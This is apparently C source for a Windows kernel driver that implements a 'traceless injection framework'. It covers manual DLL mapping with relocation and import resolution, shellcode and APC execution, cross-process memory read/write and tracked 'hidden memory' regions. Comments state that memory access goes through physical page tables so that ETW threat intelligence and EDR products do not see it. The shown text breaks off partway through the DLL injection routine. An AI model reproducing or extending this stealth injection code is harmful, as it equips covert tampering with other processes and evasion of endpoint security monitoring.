/*
 * HvInjection.c
 * 
 * 无痕注入框架实现
 * 
 * 功能：
 *   - DLL 手动映射（完整 PE 加载器）
 *   - Shellcode 注入
 *   - 跨进程内存读写
 *   - APC 代码执行引擎
 */

#include "HvInjection.h"
#include "HvHook.h"
#include "HvTypes.h"
#include "HvCompat.h"
#include "HvPhysAccess.h"
#include <ntstrsafe.h>

// P122: 全 driver DbgPrint → GUI ring
#define HV_TRACE_THIS_CAT HV_TRACE_CAT_INJECT
#include "HvTrace.h"

// ============================================================
// 类型定义（WDK 可能未导出）
// ============================================================

// KAPC_STATE 结构
typedef struct _KAPC_STATE_INJ {
    LIST_ENTRY ApcListHead[2];
    PKPROCESS Process;
    union {
        UCHAR InProgressFlags;
        struct {
            BOOLEAN KernelApcInProgress : 1;
            BOOLEAN SpecialApcInProgress : 1;
        };
    };
    BOOLEAN KernelApcPending;
    union {
        BOOLEAN UserApcPendingAll;
        struct {
            BOOLEAN SpecialUserApcPending : 1;
            BOOLEAN UserApcPending : 1;
        };
    };
} KAPC_STATE_INJ, *PKAPC_STATE_INJ;

// KAPC_ENVIRONMENT 枚举
typedef enum _KAPC_ENVIRONMENT_INJ {
    OriginalApcEnvironmentInj = 0,
    AttachedApcEnvironmentInj = 1,
    CurrentApcEnvironmentInj = 2,
    InsertApcEnvironmentInj = 3
} KAPC_ENVIRONMENT_INJ;

// HIWORD/LOWORD 宏
#ifndef HIWORD
#define HIWORD(l) ((USHORT)((((ULONG_PTR)(l)) >> 16) & 0xFFFF))
#endif

#ifndef LOWORD
#define LOWORD(l) ((USHORT)(((ULONG_PTR)(l)) & 0xFFFF))
#endif

// ============================================================
// 全局变量
// ============================================================

HV_INJECTION_MANAGER g_InjectionManager = { 0 };

// 隐藏内存区域全局列表（前向声明，用于 HvInjectionCleanup）
static LIST_ENTRY g_HiddenMemoryList = { 0 };
static KSPIN_LOCK g_HiddenMemoryLock;
static BOOLEAN g_HiddenMemoryInitialized = FALSE;
static ULONG g_HiddenMemoryCount = 0;

// PsProcessType - 进程对象类型
extern POBJECT_TYPE* PsProcessType;

// ============================================================
// 系统函数声明
// ============================================================

NTSYSAPI NTSTATUS NTAPI ZwAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
);

NTSYSAPI NTSTATUS NTAPI ZwFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType
);

NTSYSAPI NTSTATUS NTAPI ZwProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewAccessProtection,
    _Out_ PULONG OldAccessProtection
);

NTSYSAPI NTSTATUS NTAPI ZwReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead
);

NTSYSAPI NTSTATUS NTAPI ZwWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Inout_opt_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

// 获取导出函数
NTKERNELAPI PVOID NTAPI RtlFindExportedRoutineByName(
    _In_ PVOID ImageBase,
    _In_ PCSTR RoutineName
);

// 进程/线程操作
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(
    _In_ HANDLE ProcessId,
    _Out_ PEPROCESS* Process
);

NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(
    _In_ HANDLE ThreadId,
    _Out_ PETHREAD* Thread
);

NTKERNELAPI PVOID PsGetProcessPeb(
    _In_ PEPROCESS Process
);

NTKERNELAPI HANDLE PsGetProcessId(
    _In_ PEPROCESS Process
);

NTKERNELAPI BOOLEAN PsIsThreadTerminating(
    _In_ PETHREAD Thread
);

// 进程附加/分离
NTKERNELAPI VOID KeStackAttachProcess(
    _Inout_ PRKPROCESS Process,
    _Out_ PVOID ApcState
);

NTKERNELAPI VOID KeUnstackDetachProcess(
    _In_ PVOID ApcState
);

// APC 函数类型
typedef VOID (*PKNORMAL_ROUTINE_INJ)(
    _In_ PVOID NormalContext,
    _In_ PVOID SystemArgument1,
    _In_ PVOID SystemArgument2
);

typedef VOID (*PKKERNEL_ROUTINE_INJ)(
    _In_ PRKAPC Apc,
    _Inout_ PKNORMAL_ROUTINE_INJ* NormalRoutine,
    _Inout_ PVOID* NormalContext,
    _Inout_ PVOID* SystemArgument1,
    _Inout_ PVOID* SystemArgument2
);

typedef VOID (*PKRUNDOWN_ROUTINE_INJ)(
    _In_ PRKAPC Apc
);

// APC 函数声明
NTKERNELAPI VOID KeInitializeApc(
    _Out_ PRKAPC Apc,
    _In_ PRKTHREAD Thread,
    _In_ ULONG Environment,
    _In_ PVOID KernelRoutine,
    _In_opt_ PVOID RundownRoutine,
    _In_opt_ PVOID NormalRoutine,
    _In_opt_ KPROCESSOR_MODE ProcessorMode,
    _In_opt_ PVOID NormalContext
);

NTKERNELAPI BOOLEAN KeInsertQueueApc(
    _Inout_ PRKAPC Apc,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2,
    _In_ KPRIORITY Increment
);

NTKERNELAPI BOOLEAN KeTestAlertThread(
    _In_ KPROCESSOR_MODE AlertMode
);

// ============================================================
// 内部函数声明
// ============================================================

static NTSTATUS
InjectionValidatePe(
    _In_ PVOID ImageBase,
    _In_ SIZE_T ImageSize,
    _Out_ PIMAGE_NT_HEADERS64_INJ* OutNtHeaders
);

static NTSTATUS
InjectionMapSections(
    _In_ PVOID SourceImage,
    _In_ PVOID TargetBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders
);

static NTSTATUS
InjectionProcessRelocations(
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders,
    _In_ LONGLONG Delta
);

static NTSTATUS
InjectionResolveImports(
    _In_ PEPROCESS Process,
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders
);

static NTSTATUS
InjectionCallTlsCallbacks(
    _In_ PEPROCESS Process,
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders,
    _In_ ULONG Reason
);

static NTSTATUS
InjectionCallEntryPoint(
    _In_ PEPROCESS Process,
    _In_ PVOID EntryPoint,
    _In_ PVOID ImageBase,
    _In_ ULONG Reason
);

static PVOID
InjectionGetModuleBase(
    _In_ PEPROCESS Process,
    _In_ PCWSTR ModuleName
);

static PVOID
InjectionGetProcAddress(
    _In_ PVOID ModuleBase,
    _In_ PCSTR FunctionName
);

static PINJECTED_MODULE_ENTRY
InjectionFindModule(
    _In_ ULONG ProcessId,
    _In_ PVOID ModuleBase
);

// ============================================================
// 初始化和清理
// ============================================================

NTSTATUS
HvInjectionInitialize(VOID)
{
    if (g_InjectionManager.Initialized) {
        DbgPrint("[Injection] Already initialized\n");
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[Injection] Initializing Injection Manager...\n");
    
    // 初始化链表
    InitializeListHead(&g_InjectionManager.InjectedModuleList);
    g_InjectionManager.InjectedModuleCount = 0;
    
    // 初始化同步原语
    KeInitializeSpinLock(&g_InjectionManager.Lock);
    ExInitializeFastMutex(&g_InjectionManager.FastMutex);
    
    g_InjectionManager.Initialized = TRUE;
    
    DbgPrint("[Injection] Injection Manager initialized successfully\n");
    
    return STATUS_SUCCESS;
}

VOID
HvInjectionCleanup(VOID)
{
    PLIST_ENTRY entry;
    PINJECTED_MODULE_ENTRY moduleEntry;
    PHIDDEN_MEMORY_ENTRY memEntry;
    KIRQL oldIrql;
    
    if (!g_InjectionManager.Initialized) {
        return;
    }
    
    DbgPrint("[Injection] Cleaning up Injection Manager...\n");
    
    // 清理已注入模块列表
    KeAcquireSpinLock(&g_InjectionManager.Lock, &oldIrql);
    
    while (!IsListEmpty(&g_InjectionManager.InjectedModuleList)) {
        entry = RemoveHeadList(&g_InjectionManager.InjectedModuleList);
        moduleEntry = CONTAINING_RECORD(entry, INJECTED_MODULE_ENTRY, ListEntry);
        
        // 注意：不卸载模块，仅清理记录
        ExFreePoolWithTag(moduleEntry, HV_INJECTION_TAG);
    }
    
    g_InjectionManager.InjectedModuleCount = 0;
    
    KeReleaseSpinLock(&g_InjectionManager.Lock, oldIrql);
    
    // 清理隐藏内存区域列表
    if (g_HiddenMemoryInitialized) {
        KeAcquireSpinLock(&g_HiddenMemoryLock, &oldIrql);
        while (!IsListEmpty(&g_HiddenMemoryList)) {
            entry = RemoveHeadList(&g_HiddenMemoryList);
            memEntry = CONTAINING_RECORD(entry, HIDDEN_MEMORY_ENTRY, ListEntry);
            ExFreePoolWithTag(memEntry, HV_INJECTION_TAG);
        }
        g_HiddenMemoryCount = 0;
        KeReleaseSpinLock(&g_HiddenMemoryLock, oldIrql);
        g_HiddenMemoryInitialized = FALSE;
        DbgPrint("[Injection] Hidden memory regions cleaned up\n");
    }
    
    g_InjectionManager.Initialized = FALSE;
    
    DbgPrint("[Injection] Injection Manager cleaned up\n");
}

BOOLEAN
HvInjectionIsInitialized(VOID)
{
    return g_InjectionManager.Initialized;
}

// ============================================================
// 进程操作
// ============================================================

NTSTATUS
HvAttachProcess(
    _In_ ULONG ProcessId,
    _Out_ PEPROCESS* OutProcess,
    _Out_ PVOID OutApcState
)
{
    NTSTATUS status;
    PEPROCESS process;
    
    if (!OutProcess || !OutApcState) {
        return STATUS_INVALID_PARAMETER;
    }
    
    *OutProcess = NULL;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] PsLookupProcessByProcessId failed: 0x%X\n", status);
        return status;
    }
    
    // 检查进程是否正在退出
    if (PsGetProcessExitStatus(process) != STATUS_PENDING) {
        ObDereferenceObject(process);
        return STATUS_PROCESS_IS_TERMINATING;
    }
    
    // 附加到进程（cast PEPROCESS → PRKPROCESS；WDK 头声明用 PRKPROCESS，二者底层等价）
    KeStackAttachProcess((PRKPROCESS)process, OutApcState);
    
    *OutProcess = process;
    
    return STATUS_SUCCESS;
}

VOID
HvDetachProcess(
    _In_ PEPROCESS Process,
    _In_ PVOID ApcState
)
{
    if (!Process || !ApcState) {
        return;
    }
    
    KeUnstackDetachProcess(ApcState);
    ObDereferenceObject(Process);
}

// ============================================================
// 内存操作
// ============================================================

NTSTATUS
HvMemoryRead(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _Out_ PVOID Buffer,
    _In_ SIZE_T Size,
    _Out_opt_ PSIZE_T BytesRead
)
{
    // #29: 改走 HvPhysAccess —— 4 级页表 walk + MmMapIoSpace,完全绕开
    // KeStackAttachProcess + RtlCopyMemory 路径,ETWTI/EDR 看不到上下文切换。
    // SEH 包装在 HvPhysReadProcessMemory 内部,这里不再需要 __try。
    if (!Buffer || Size == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    return HvPhysReadProcessMemory(ProcessId, (UINT64)Address, Buffer, Size, BytesRead);
}

NTSTATUS
HvMemoryWrite(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_ PVOID Buffer,
    _In_ SIZE_T Size,
    _Out_opt_ PSIZE_T BytesWritten
)
{
    // #29: 同 HvMemoryRead,改走物理页直通。
    if (!Buffer || Size == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    return HvPhysWriteProcessMemory(ProcessId, (UINT64)Address, Buffer, Size, BytesWritten);
}

NTSTATUS
HvMemoryAllocate(
    _In_ ULONG ProcessId,
    _In_ SIZE_T Size,
    _In_ ULONG Protection,
    _Out_ PVOID* OutAddress
)
{
    // #30: 改走 HvPhysAccess —— 直接在目标进程页表插入 PTE,完全绕开
    // ZwAllocateVirtualMemory + KeStackAttachProcess 路径。
    if (!OutAddress || Size == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    *OutAddress = NULL;
    UINT64 gva = 0;  // 0 = 自动选址
    NTSTATUS status = HvPhysAllocateInProcess(ProcessId, Size, Protection, &gva);
    if (NT_SUCCESS(status)) {
        *OutAddress = (PVOID)gva;
        DbgPrint("[Injection] HvPhysAllocateInProcess: pid=%u size=0x%llX prot=0x%X gva=%p\n",
            ProcessId, (ULONGLONG)Size, Protection, (PVOID)gva);
    } else {
        DbgPrint("[Injection] HvPhysAllocateInProcess failed: 0x%X\n", status);
    }
    return status;
}

NTSTATUS
HvMemoryFree(
    _In_ ULONG ProcessId,
    _In_ PVOID Address
)
{
    // #30: 同 Allocate,清 PTE + INVLPG 广播 + 物理页归还。
    if (!Address) {
        return STATUS_INVALID_PARAMETER;
    }

    // Size 由跟踪记录自带,这里传 0 表示按 record 完整释放。
    NTSTATUS status = HvPhysFreeInProcess(ProcessId, (UINT64)Address, 0);
    if (NT_SUCCESS(status)) {
        DbgPrint("[Injection] HvPhysFreeInProcess: pid=%u gva=%p\n", ProcessId, Address);
    } else {
        DbgPrint("[Injection] HvPhysFreeInProcess failed: 0x%X\n", status);
    }
    return status;
}

NTSTATUS
HvMemoryProtect(
    _In_ ULONG ProcessId,
    _In_ PVOID Address,
    _In_ SIZE_T Size,
    _In_ ULONG NewProtection,
    _Out_opt_ PULONG OldProtection
)
{
    NTSTATUS status;
    PEPROCESS process;
    KAPC_STATE_INJ apcState;
    PVOID baseAddress = Address;
    SIZE_T regionSize = Size;
    ULONG oldProtect = 0;
    
    status = HvAttachProcess(ProcessId, &process, &apcState);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    status = ZwProtectVirtualMemory(
        ZwCurrentProcess(),
        &baseAddress,
        &regionSize,
        NewProtection,
        &oldProtect
    );
    
    HvDetachProcess(process, &apcState);
    
    if (OldProtection) {
        *OldProtection = oldProtect;
    }
    
    return status;
}

// ============================================================
// PE 验证和解析
// ============================================================

static NTSTATUS
InjectionValidatePe(
    _In_ PVOID ImageBase,
    _In_ SIZE_T ImageSize,
    _Out_ PIMAGE_NT_HEADERS64_INJ* OutNtHeaders
)
{
    PIMAGE_DOS_HEADER_INJ dosHeader;
    PIMAGE_NT_HEADERS64_INJ ntHeaders;
    
    if (!ImageBase || ImageSize < sizeof(IMAGE_DOS_HEADER_INJ) || !OutNtHeaders) {
        return STATUS_INVALID_PARAMETER;
    }
    
    *OutNtHeaders = NULL;
    
    __try {
        dosHeader = (PIMAGE_DOS_HEADER_INJ)ImageBase;
        
        // 验证 DOS 头
        if (dosHeader->e_magic != 0x5A4D) {  // "MZ"
            DbgPrint("[Injection] Invalid DOS signature\n");
            return STATUS_INVALID_IMAGE_FORMAT;
        }
        
        // 验证 PE 头偏移
        if ((ULONG)dosHeader->e_lfanew > ImageSize - sizeof(IMAGE_NT_HEADERS64_INJ)) {
            DbgPrint("[Injection] Invalid PE header offset\n");
            return STATUS_INVALID_IMAGE_FORMAT;
        }
        
        ntHeaders = (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)ImageBase + dosHeader->e_lfanew);
        
        // 验证 PE 签名
        if (ntHeaders->Signature != 0x4550) {  // "PE\0\0"
            DbgPrint("[Injection] Invalid PE signature\n");
            return STATUS_INVALID_IMAGE_FORMAT;
        }
        
        // 验证是否为 64 位
        if (ntHeaders->OptionalHeader.Magic != 0x20B) {  // PE32+
            DbgPrint("[Injection] Not a 64-bit PE\n");
            return STATUS_INVALID_IMAGE_FORMAT;
        }
        
        // 验证映像大小
        if (ntHeaders->OptionalHeader.SizeOfImage > 0x10000000) {  // 256 MB 限制
            DbgPrint("[Injection] Image too large\n");
            return STATUS_INVALID_IMAGE_FORMAT;
        }
        
        *OutNtHeaders = ntHeaders;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    return STATUS_SUCCESS;
}

// ============================================================
// 节区映射
// ============================================================

static NTSTATUS
InjectionMapSections(
    _In_ PVOID SourceImage,
    _In_ PVOID TargetBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders
)
{
    PIMAGE_SECTION_HEADER_INJ section;
    ULONG i;
    
    __try {
        // 首先复制 PE 头
        RtlCopyMemory(
            TargetBase,
            SourceImage,
            NtHeaders->OptionalHeader.SizeOfHeaders
        );
        
        // 获取第一个节区
        section = (PIMAGE_SECTION_HEADER_INJ)(
            (PUCHAR)&NtHeaders->OptionalHeader +
            NtHeaders->FileHeader.SizeOfOptionalHeader
        );
        
        // 复制各个节区
        for (i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++, section++) {
            if (section->SizeOfRawData == 0) {
                continue;
            }
            
            PVOID sourceSection = (PUCHAR)SourceImage + section->PointerToRawData;
            PVOID targetSection = (PUCHAR)TargetBase + section->VirtualAddress;
            SIZE_T copySize = min(section->SizeOfRawData, section->Misc.VirtualSize);
            
            DbgPrint("[Injection] Mapping section %.8s: %p -> %p (0x%X bytes)\n",
                section->Name, sourceSection, targetSection, (ULONG)copySize);
            
            RtlCopyMemory(targetSection, sourceSection, copySize);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    return STATUS_SUCCESS;
}

// ============================================================
// 重定位处理
// ============================================================

static NTSTATUS
InjectionProcessRelocations(
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders,
    _In_ LONGLONG Delta
)
{
    PIMAGE_DATA_DIRECTORY_INJ relocDir;
    PIMAGE_BASE_RELOCATION_INJ reloc;
    ULONG relocSize;
    PUSHORT relocData;
    ULONG i;
    
    if (Delta == 0) {
        return STATUS_SUCCESS;
    }
    
    relocDir = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (relocDir->VirtualAddress == 0 || relocDir->Size == 0) {
        DbgPrint("[Injection] No relocations\n");
        return STATUS_SUCCESS;
    }
    
    __try {
        reloc = (PIMAGE_BASE_RELOCATION_INJ)((PUCHAR)ImageBase + relocDir->VirtualAddress);
        relocSize = relocDir->Size;
        
        while (relocSize > 0 && reloc->SizeOfBlock > 0) {
            ULONG numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION_INJ)) / sizeof(USHORT);
            relocData = (PUSHORT)((PUCHAR)reloc + sizeof(IMAGE_BASE_RELOCATION_INJ));
            
            for (i = 0; i < numEntries; i++) {
                USHORT entry = relocData[i];
                USHORT type = entry >> 12;
                USHORT offset = entry & 0xFFF;
                PVOID address = (PUCHAR)ImageBase + reloc->VirtualAddress + offset;
                
                switch (type) {
                    case IMAGE_REL_BASED_ABSOLUTE:
                        // 无需处理
                        break;
                        
                    case IMAGE_REL_BASED_DIR64:
                        *(PULONGLONG)address += Delta;
                        break;
                        
                    case IMAGE_REL_BASED_HIGHLOW:
                        *(PULONG)address += (ULONG)Delta;
                        break;
                        
                    case IMAGE_REL_BASED_HIGH:
                        *(PUSHORT)address += HIWORD(Delta);
                        break;
                        
                    case IMAGE_REL_BASED_LOW:
                        *(PUSHORT)address += LOWORD(Delta);
                        break;
                        
                    default:
                        DbgPrint("[Injection] Unknown relocation type: %d\n", type);
                        break;
                }
            }
            
            relocSize -= reloc->SizeOfBlock;
            reloc = (PIMAGE_BASE_RELOCATION_INJ)((PUCHAR)reloc + reloc->SizeOfBlock);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    DbgPrint("[Injection] Relocations processed, delta = 0x%llX\n", Delta);
    
    return STATUS_SUCCESS;
}

// ============================================================
// 导入解析
// ============================================================

static PVOID
InjectionGetModuleBase(
    _In_ PEPROCESS Process,
    _In_ PCWSTR ModuleName
)
{
    PPEB peb;
    PVOID ldr;
    PLIST_ENTRY listHead;
    PLIST_ENTRY listEntry;
    UNICODE_STRING targetName;
    
    // 获取 PEB
    peb = PsGetProcessPeb(Process);
    if (!peb) {
        return NULL;
    }
    
    RtlInitUnicodeString(&targetName, ModuleName);
    
    __try {
        // PEB_LDR_DATA 在 PEB + 0x18 (x64)
        ldr = *(PVOID*)((PUCHAR)peb + 0x18);
        if (!ldr) {
            return NULL;
        }
        
        // InLoadOrderModuleList 在 PEB_LDR_DATA + 0x10
        listHead = (PLIST_ENTRY)((PUCHAR)ldr + 0x10);
        
        for (listEntry = listHead->Flink; listEntry != listHead; listEntry = listEntry->Flink) {
            // LDR_DATA_TABLE_ENTRY 结构
            // BaseDllName 在偏移 0x58 (UNICODE_STRING)
            // DllBase 在偏移 0x30
            
            PUNICODE_STRING baseName = (PUNICODE_STRING)((PUCHAR)listEntry + 0x58);
            PVOID dllBase = *(PVOID*)((PUCHAR)listEntry + 0x30);
            
            if (baseName->Buffer && baseName->Length > 0) {
                if (RtlCompareUnicodeString(baseName, &targetName, TRUE) == 0) {
                    return dllBase;
                }
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Injection] Exception in GetModuleBase\n");
    }
    
    return NULL;
}

static PVOID
InjectionGetProcAddress(
    _In_ PVOID ModuleBase,
    _In_ PCSTR FunctionName
)
{
    PIMAGE_DOS_HEADER_INJ dosHeader;
    PIMAGE_NT_HEADERS64_INJ ntHeaders;
    PIMAGE_DATA_DIRECTORY_INJ exportDir;
    PULONG addressOfFunctions;
    PULONG addressOfNames;
    PUSHORT addressOfOrdinals;
    ULONG numberOfNames;
    ULONG i;
    
    if (!ModuleBase || !FunctionName) {
        return NULL;
    }
    
    __try {
        dosHeader = (PIMAGE_DOS_HEADER_INJ)ModuleBase;
        if (dosHeader->e_magic != 0x5A4D) {
            return NULL;
        }
        
        ntHeaders = (PIMAGE_NT_HEADERS64_INJ)((PUCHAR)ModuleBase + dosHeader->e_lfanew);
        if (ntHeaders->Signature != 0x4550) {
            return NULL;
        }
        
        exportDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (exportDir->VirtualAddress == 0) {
            return NULL;
        }
        
        typedef struct _IMAGE_EXPORT_DIRECTORY_INJ {
            ULONG Characteristics;
            ULONG TimeDateStamp;
            USHORT MajorVersion;
            USHORT MinorVersion;
            ULONG Name;
            ULONG Base;
            ULONG NumberOfFunctions;
            ULONG NumberOfNames;
            ULONG AddressOfFunctions;
            ULONG AddressOfNames;
            ULONG AddressOfNameOrdinals;
        } IMAGE_EXPORT_DIRECTORY_INJ, *PIMAGE_EXPORT_DIRECTORY_INJ;
        
        PIMAGE_EXPORT_DIRECTORY_INJ exports = 
            (PIMAGE_EXPORT_DIRECTORY_INJ)((PUCHAR)ModuleBase + exportDir->VirtualAddress);
        
        addressOfFunctions = (PULONG)((PUCHAR)ModuleBase + exports->AddressOfFunctions);
        addressOfNames = (PULONG)((PUCHAR)ModuleBase + exports->AddressOfNames);
        addressOfOrdinals = (PUSHORT)((PUCHAR)ModuleBase + exports->AddressOfNameOrdinals);
        numberOfNames = exports->NumberOfNames;
        
        for (i = 0; i < numberOfNames; i++) {
            PCSTR currentName = (PCSTR)((PUCHAR)ModuleBase + addressOfNames[i]);
            
            if (strcmp(currentName, FunctionName) == 0) {
                USHORT ordinal = addressOfOrdinals[i];
                ULONG rva = addressOfFunctions[ordinal];
                return (PUCHAR)ModuleBase + rva;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Injection] Exception in GetProcAddress\n");
    }
    
    return NULL;
}

static NTSTATUS
InjectionResolveImports(
    _In_ PEPROCESS Process,
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders
)
{
    PIMAGE_DATA_DIRECTORY_INJ importDir;
    PIMAGE_IMPORT_DESCRIPTOR_INJ importDesc;
    NTSTATUS status = STATUS_SUCCESS;
    
    importDir = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (importDir->VirtualAddress == 0 || importDir->Size == 0) {
        DbgPrint("[Injection] No imports\n");
        return STATUS_SUCCESS;
    }
    
    __try {
        importDesc = (PIMAGE_IMPORT_DESCRIPTOR_INJ)((PUCHAR)ImageBase + importDir->VirtualAddress);
        
        while (importDesc->Name != 0) {
            PCSTR moduleName = (PCSTR)((PUCHAR)ImageBase + importDesc->Name);
            PVOID moduleBase;
            PULONGLONG thunk;
            PULONGLONG origThunk;
            
            // 将 ANSI 转换为 Unicode
            WCHAR moduleNameW[MAX_MODULE_NAME_LENGTH];
            ANSI_STRING ansiName;
            UNICODE_STRING uniName;
            
            RtlInitAnsiString(&ansiName, moduleName);
            uniName.Buffer = moduleNameW;
            uniName.Length = 0;
            uniName.MaximumLength = sizeof(moduleNameW);
            
            status = RtlAnsiStringToUnicodeString(&uniName, &ansiName, FALSE);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[Injection] Failed to convert module name\n");
                importDesc++;
                continue;
            }
            
            DbgPrint("[Injection] Resolving imports from: %s\n", moduleName);
            
            // 获取模块基址
            moduleBase = InjectionGetModuleBase(Process, moduleNameW);
            if (!moduleBase) {
                DbgPrint("[Injection] Module not found: %s\n", moduleName);
                // 尝试使用 ntdll.dll 作为后备
                importDesc++;
                continue;
            }
            
            // 获取 thunk 数组
            if (importDesc->OriginalFirstThunk) {
                origThunk = (PULONGLONG)((PUCHAR)ImageBase + importDesc->OriginalFirstThunk);
            } else {
                origThunk = (PULONGLONG)((PUCHAR)ImageBase + importDesc->FirstThunk);
            }
            
            thunk = (PULONGLONG)((PUCHAR)ImageBase + importDesc->FirstThunk);
            
            while (*origThunk) {
                PVOID funcAddress = NULL;
                
                if (*origThunk & 0x8000000000000000ULL) {
                    // 按序号导入
                    USHORT ordinal = (USHORT)(*origThunk & 0xFFFF);
                    // 需要通过序号解析（简化：不支持）
                    DbgPrint("[Injection] Ordinal import not supported: %d\n", ordinal);
                } else {
                    // 按名称导入
                    PIMAGE_IMPORT_BY_NAME_INJ importByName = 
                        (PIMAGE_IMPORT_BY_NAME_INJ)((PUCHAR)ImageBase + (*origThunk & 0x7FFFFFFFFFFFFFFFULL));
                    
                    funcAddress = InjectionGetProcAddress(moduleBase, importByName->Name);
                    
                    if (!funcAddress) {
                        DbgPrint("[Injection] Function not found: %s!%s\n", 
                            moduleName, importByName->Name);
                    }
                }
                
                *thunk = (ULONGLONG)funcAddress;
                
                origThunk++;
                thunk++;
            }
            
            importDesc++;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[Injection] Exception resolving imports: 0x%X\n", status);
    }
    
    return status;
}

// ============================================================
// TLS 回调
// ============================================================

static NTSTATUS
InjectionCallTlsCallbacks(
    _In_ PEPROCESS Process,
    _In_ PVOID ImageBase,
    _In_ PIMAGE_NT_HEADERS64_INJ NtHeaders,
    _In_ ULONG Reason
)
{
    PIMAGE_DATA_DIRECTORY_INJ tlsDir;
    PIMAGE_TLS_DIRECTORY64_INJ tlsDirectory;
    ULONGLONG* callbacks;
    
    tlsDir = &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    
    if (tlsDir->VirtualAddress == 0 || tlsDir->Size == 0) {
        return STATUS_SUCCESS;
    }
    
    __try {
        tlsDirectory = (PIMAGE_TLS_DIRECTORY64_INJ)((PUCHAR)ImageBase + tlsDir->VirtualAddress);
        
        if (tlsDirectory->AddressOfCallBacks) {
            callbacks = (ULONGLONG*)tlsDirectory->AddressOfCallBacks;
            
            while (*callbacks) {
                typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID, ULONG, PVOID);
                PIMAGE_TLS_CALLBACK callback = (PIMAGE_TLS_CALLBACK)*callbacks;
                
                DbgPrint("[Injection] Calling TLS callback at %p\n", callback);
                
                // TLS 回调需要在用户模式执行
                // 这里简化处理，实际应通过 APC 执行
                // callback(ImageBase, Reason, NULL);
                
                callbacks++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    return STATUS_SUCCESS;
}

// ============================================================
// DLL 注入
// ============================================================

NTSTATUS
HvInjectDll(
    _In_ ULONG ProcessId,
    _In_ PVOID DllBuffer,
    _In_ SIZE_T DllSize,
    _Out_opt_ PHV_INJECTION_RESULT OutResult
)
{
    NTSTATUS status;
    PEPROCESS process;
    KAPC_STATE_INJ apcState;
    PIMAGE_NT_HEADERS64_INJ ntHeaders = NULL;
    PVOID targetBase = NULL;
    SIZE_T imageSize;
    LONGLONG delta;
    PINJECTED_MODULE_ENTRY moduleEntry;
    KIRQL oldIrql;
    
    DbgPrint("[Injection] ========== DLL Injection Start ==========\n");
    DbgPrint("[Injection] Target PID: %d, DLL Size: 0x%llX\n", ProcessId, (ULONGLONG)DllSize);
    
    if (!g_InjectionManager.Initialized) {
        status = HvInjectionInitialize();
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }
    
    if (OutResult) {
        RtlZeroMemory(OutResult, sizeof(HV_INJECTION_RESULT));
    }
    
    // 验证 PE
    status = InjectionValidatePe(DllBuffer, DllSize, &ntHeaders);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[Injection] PE validation failed: 0x%X\n", status);
        return status;
    }
    
    imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    DbgPrint("[Injection] Image size: 0x%llX\n", (ULONGLONG)imageSize);
    
